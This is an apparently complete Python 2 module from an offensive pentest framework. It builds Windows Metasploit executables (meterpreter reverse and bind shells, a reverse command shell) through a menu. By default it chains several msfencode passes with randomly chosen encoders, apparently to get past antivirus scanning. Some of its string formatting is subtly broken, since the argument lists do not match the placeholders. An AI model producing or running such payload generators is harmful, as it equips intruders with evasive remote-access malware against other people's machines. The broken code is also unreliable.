#!/usr/bin/python
#
# generate windows payload
# 
# 02/03/2012
# Added basic multi-encoding
#

import os
import subprocess
from random import choice
from src.core import menus
from src.core.main import *
from time import sleep

encoders = [
"x86/alpha_mixed",
"x86/nonupper",
"x86/alpha_upper", 
"x86/countdown", 
"x86/shikata_ga_nai",
"x86/countdown",
"x86/call4_dword_xor", 
"x86/fnstenv_mov", 
"x86/jmp_call_additive",
"x86/nonalpha"
]

while 1:
	try:

		# define msf path
		path = msfpath()

		# interface ip
		iface = iface_ip()

		# select payload
		selection = 0
		while selection != range(1,4):
			clear()
			menus.win_menu1()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "windows/meterpreter/bind_tcp"
				break
			if selection == '3':
				payload = "windows/shell/reverse_tcp"
				break
			if selection == '4':
				payload = "windows/meterpreter/bind_tcp"
				break

		# shall we encode the payload?
		menus.win_enc_menu()
		encoding = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))

		#			
		# get some user info
		# if using bind payloads don't ask for ip
		#
		if not selection or selection in ('1','3'):
			ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
			if ip == '':
				ip = iface
		port = raw_input(" Enter a port (default 8080): ")
		if port == '':
			port = 8080
		filename = raw_input(" Enter a name for executeable: ")

		# create payload
		#
		# if encoding is 1 then run multi-encoder
		# nothing special just piping through msfencode
		#
		PrintInfo("Creating payload in output directory. Please wait...")
		if encoding == '1' or encoding == '':
			if not selection or selection in ('1','3'):
				subprocess.Popen("msfpayload %s LHOST=%s LPORT=%s R | msfencode -c 2 -e %s -t raw | msfencode -t raw -e %s -c 2 | msfencode -t raw -e %s -c 2 | msfencode -t exe -c 2 -e %s -o output/%s.exe" % (path, payload, ip, port, path, choice(encoders), path, choice(encoders), path, choice(encoders), path, choice(encoders), filename), shell=True).wait()
			else:
				subprocess.Popen("msfpayload %s LPORT=%s R | msfencode -e x86/shikata_ga_nai -t raw -c 5 | msfencode -t raw -e x86/alpha_upper -c 2 | msfencode -t raw -e x86/shikata_ga_nai -c 5 | msfencode -t exe -c 5 -e x86/countdown -o output/%s.exe" % (path, payload, port, path, path, path, path, filename), shell=True).wait()
		#
		# if encoding is 2 then skip encoding
		# and just create payload
		#
		elif encoding == '2':
			if not selection or selection in ('1','3'):
				subprocess.Popen("msfpayload %s lhost=%s lport=%s X > output/%s.exe" % (msfpath(), payload, ip, port, filename), shell=True).wait()
			else:
				subprocess.Popen("msfpayload %s lport=%s X > output/%s.exe" % (msfpath(), payload, port, filename), shell=True).wait()
			
		raw_input("\nPress %sENTER%s to continue" % (colours.bold, colours.reset))			
		# return to main
		break
	except KeyboardInterrupt:
		break
